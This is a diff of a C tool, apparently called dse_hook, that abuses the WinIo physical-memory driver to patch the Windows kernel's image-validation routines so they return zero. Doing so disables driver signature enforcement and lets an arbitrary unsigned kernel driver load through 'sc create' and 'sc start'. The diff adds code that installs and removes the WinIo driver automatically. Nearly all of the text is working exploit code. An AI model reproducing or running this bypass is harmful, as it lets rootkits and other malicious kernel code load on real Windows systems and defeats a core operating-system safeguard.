@@ -6,7 +6,6 @@
 typedef unsigned long u32;
 typedef unsigned long long u64;
 
-u64 driver_handle;
 #define IOCTL_MAP 0x80102040
 #define IOCTL_UNMAP 0x80102044
 
@@ -23,6 +22,9 @@ char patch[6] = {
 	0xB8, 0x00, 0x00, 0x00, 0x00,	// mov rax, 0
 	0xC3							// ret
 };
+
+u64 driver_handle = -1;
+char winio_path[FILENAME_MAX];
 
 struct winio_packet
 {
@@ -128,22 +130,46 @@ void rands(char* str, int size) {
 	}
 }
 
+void load_driver_lazy(const char* driver_name, const char* bin_path)
+{
+	u64 cmdline_create_buf = (u64)malloc(strlen(driver_name) + strlen(bin_path) + 53);
+	u64 cmdline_start_buf = (u64)malloc(strlen(driver_name) + 14);
+	printf("%s\n", bin_path);
+	sprintf((char*)cmdline_create_buf, "sc create %s binpath=\"%s\" type=kernel>NUL", driver_name, bin_path);
+	sprintf((char*)cmdline_start_buf, "sc start %s>NUL", driver_name);
+	system((char*)cmdline_create_buf);
+	system((char*)cmdline_start_buf);
+}
+
 int main(int argc, char* argv[])
 {
 	printf("[*] dse_hook by emlinhax\n");
 
-	if (argc != 3)
+	if (argc != 3 || (strlen(argv[1]) < 2 || strlen(argv[2]) < 2))
 	{
 		printf("[!] usage: dse_hook.exe your_driver_name c:\\your_driver.sys\n");
 		Sleep(1000);
 		return -1;
 	}
 
-	printf("[*] opening handle to driver...\n");
+	LOAD_WINIO:
+	printf("[*] attempting to open handle to winio...\n");
 	driver_handle = (u64)CreateFileA("\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	printf("[*] driver_handle: %p\n", driver_handle);
 	if (driver_handle == -1)
-		return -2;
+	{
+		GetCurrentDirectoryA(FILENAME_MAX, winio_path);
+		strcat(winio_path, "\\WinIO64.sys");
+		load_driver_lazy("winio_dse_hook", winio_path);
+		goto LOAD_WINIO;
+	}
+	if (driver_handle == -1)
+	{
+		printf("[!] could not load winio driver.\n");
+		Sleep(2000);
+	}
+	printf("[*] driver_handle: %p\n", driver_handle);
+
+	// ####
 
 	printf("[*] finding ntoskrnl...\n");
 	u64 ntos_base_pa = 0;
@@ -162,7 +188,7 @@ int main(int argc, char* argv[])
 
 	if (!ntos_base_pa)
 	{
-		printf("[!] could not find ntoskrnl base.");
+		printf("[!] could not find ntoskrnl base.\n");
 		Sleep(2000);
 		return -3;
 	}
@@ -172,7 +198,7 @@ int main(int argc, char* argv[])
 	u64 se_validate_image_header_pa = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, (unsigned char*)&se_validate_image_header_pattern, sizeof(se_validate_image_header_pattern));
 	if (se_validate_image_data_pa == 0 || se_validate_image_header_pa == 0)
 	{
-		printf("[!] could not find one or both patterns.");
+		printf("[!] could not find one or both patterns.\n");
 		Sleep(2000);
 		return -4;
 	}
@@ -181,21 +207,24 @@ int main(int argc, char* argv[])
 	read_phys(se_validate_image_data_pa, (u64)&se_validate_image_data_original, sizeof(se_validate_image_data_original));
 	read_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, sizeof(se_validate_image_header_original));
 
-	// patch both functions to return zero
+	// patch both routines to return zero
 	write_phys(se_validate_image_data_pa, (u64)&patch, sizeof(patch));
 	write_phys(se_validate_image_header_pa, (u64)&patch, sizeof(patch));
+	printf("[*] patched validation routines.\n");
 
 	// start the target driver
-	u64 cmdline_create_buf = (u64)malloc(strlen(argv[2]) + 53);
-	u64 cmdline_start__buf = (u64)malloc(30);
-	sprintf((char*)cmdline_create_buf, "sc create %s binpath=\"%s\" type=kernel>NUL", argv[1], argv[2]);
-	sprintf((char*)cmdline_start__buf, "sc start %s>NUL", argv[1]);
-	system((char*)cmdline_create_buf);
-	system((char*)cmdline_start__buf);
+	load_driver_lazy(argv[1], argv[2]);
+	printf("[*] loaded driver!\n");
 
 	// unpatch both functions
 	write_phys(se_validate_image_data_pa, (u64)&se_validate_image_data_original, sizeof(se_validate_image_data_original));
 	write_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, sizeof(se_validate_image_header_original));
+	printf("[*] restored validation routines.\n");
+
+	// unload winio driver
+	system("sc stop winio_dse_hook >NUL");
+	system("sc delete winio_dse_hook >NUL");
+	printf("[*] unloaded winio driver.\n");
 
 	printf("[*] done!\n");
 	Sleep(2000);
